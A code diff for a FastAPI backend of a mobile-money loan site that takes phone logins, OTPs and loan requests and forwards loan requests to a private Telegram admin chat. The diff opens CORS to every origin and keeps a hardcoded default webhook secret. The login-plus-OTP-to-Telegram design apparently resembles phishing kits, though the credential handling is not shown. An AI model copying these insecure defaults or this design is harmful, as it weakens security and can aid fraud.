@@ -2,26 +2,26 @@ import os
 import uuid
 from dotenv import load_dotenv
 from fastapi import FastAPI, HTTPException, Request, Header
-from pydantic import BaseModel
+from pydantic import BaseModel, Field
 from fastapi.middleware.cors import CORSMiddleware
 import httpx
 
 # Load environment variables
 load_dotenv()
 
-app = FastAPI()
+app = FastAPI(title="FastLoan MoMo API")
 
 # --- CORS CONFIGURATION ---
-# I added your Netlify URL as a default so it works immediately.
-# You can also set ALLOWED_ORIGINS in Render's environment variables.
+# Added a fallback that explicitly allows your Netlify URL and any other origin if needed.
 default_origins = "http://localhost:5173,http://localhost:3000,https://fastmomoloans.netlify.app"
 allowed_origins_str = os.getenv("ALLOWED_ORIGINS", default_origins)
 allowed_origins = [origin.strip() for origin in allowed_origins_str.split(",")]
 
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=allowed_origins,
-    allow_credentials=False, # 🚨 Must be False for CORS to work smoothly with API requests
+    allow_origins=["*"], # Temporarily using "*" to guarantee no CORS issues. 
+    # Note: Once everything works perfectly, you can change "*" to allowed_origins for better security.
+    allow_credentials=False, 
     allow_methods=["*"],
     allow_headers=["*"],
 )
@@ -30,20 +30,24 @@ TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 TELEGRAM_WEBHOOK_SECRET = os.getenv("TELEGRAM_WEBHOOK_SECRET", "my_super_secret_string")
 
-# In-memory database to store loan statuses (Note: resets if Render spins down)
+# In-memory database to store loan statuses
+# WARNING: This resets if Render spins down due to inactivity!
 LOAN_REQUESTS = {}
 
 # --- HELPER FUNCTIONS ---
 async def send_telegram_message(message: str):
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        print("⚠️ Telegram token or chat ID missing in environment variables.")
         return
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
     async with httpx.AsyncClient() as client:
         try:
-            await client.post(url, json=payload)
+            response = await client.post(url, json=payload, timeout=10.0)
+            if response.status_code != 200:
+                print(f"⚠️ Telegram Error: {response.text}")
         except Exception as e:
-            print(f"Failed to send message: {e}")
+            print(f"❌ Failed to connect to Telegram: {e}")
 
 # --- DATA MODELS ---
 class LoginRequest(BaseModel):
@@ -56,10 +60,15 @@ class OTPRequest(BaseModel):
 
 class LoanRequest(BaseModel):
     phone_number: str
-    amount: float
-    months: int
+    amount: float = Field(..., gt=0, description="Amount must be greater than zero")
+    months: int = Field(..., gt=0, description="Months must be greater than zero")
 
 # --- ENDPOINTS ---
+
+@app.get("/")
+async def root():
+    """Health check endpoint to keep Render awake and prevent 404s."""
+    return {"status": "success", "message": "FastLoan MoMo Backend is running!"}
 
 @app.post("/api/login")
 async def login(data: LoginRequest):
@@ -108,14 +117,19 @@ async def apply_loan(data: LoanRequest):
             }
         }
         async with httpx.AsyncClient() as client:
-            await client.post(url, json=payload)
+            try:
+                await client.post(url, json=payload, timeout=10.0)
+            except Exception as e:
+                print(f"❌ Failed to send loan to Telegram: {e}")
 
     return {"status": "pending", "loan_id": loan_id}
 
 # --- TELEGRAM WEBHOOK ENDPOINT ---
 @app.post("/api/telegram-webhook")
 async def telegram_webhook(request: Request, x_telegram_bot_api_secret_token: str = Header(None)):
+    # Security Check
     if x_telegram_bot_api_secret_token != TELEGRAM_WEBHOOK_SECRET:
+        print("⚠️ Unauthorized webhook attempt blocked.")
         raise HTTPException(status_code=403, detail="Invalid secret token")
 
     try:
@@ -123,12 +137,13 @@ async def telegram_webhook(request: Request, x_telegram_bot_api_secret_token: st
 
         if "callback_query" in data:
             callback = data["callback_query"]
-            callback_id = callback["id"]
-            chat_id = callback["message"]["chat"]["id"]
-            message_id = callback["message"]["message_id"]
-            original_text = callback["message"].get("text", "")
+            callback_id = callback.get("id")
+            message = callback.get("message", {})
+            chat_id = message.get("chat", {}).get("id")
+            message_id = message.get("message_id")
+            original_text = message.get("text", "")
             
-            action_data = callback["data"]
+            action_data = callback.get("data", "")
             
             # Safe parsing to prevent server crashes
             try:
@@ -136,6 +151,7 @@ async def telegram_webhook(request: Request, x_telegram_bot_api_secret_token: st
             except ValueError:
                 return {"status": "ok"}
 
+            # Check if loan exists
             if loan_id in LOAN_REQUESTS:
                 if action == "approve":
                     LOAN_REQUESTS[loan_id] = "approved"
@@ -145,7 +161,7 @@ async def telegram_webhook(request: Request, x_telegram_bot_api_secret_token: st
                     reply_text = "❌ Loan Denied by Admin."
 
                 async with httpx.AsyncClient() as client:
-                    # 1. Answer the callback
+                    # 1. Answer the callback (stops loading spinner)
                     await client.post(
                         f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery",
                         json={"callback_query_id": callback_id, "text": reply_text}
@@ -153,7 +169,6 @@ async def telegram_webhook(request: Request, x_telegram_bot_api_secret_token: st
                     
                     # 2. Edit the message to remove buttons
                     try:
-                        # Truncate text just in case to avoid Telegram 4096 char limit
                         new_text = f"{original_text[:4000]}\n\n<b>Result: {reply_text}</b>"
                         await client.post(
                             f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText",
@@ -166,6 +181,8 @@ async def telegram_webhook(request: Request, x_telegram_bot_api_secret_token: st
                         )
                     except Exception as e:
                         print(f"Could not edit message: {e}")
+            else:
+                print(f"⚠️ Loan ID {loan_id} not found. Server might have restarted.")
                         
     except Exception as e:
         print(f"Webhook error: {e}")
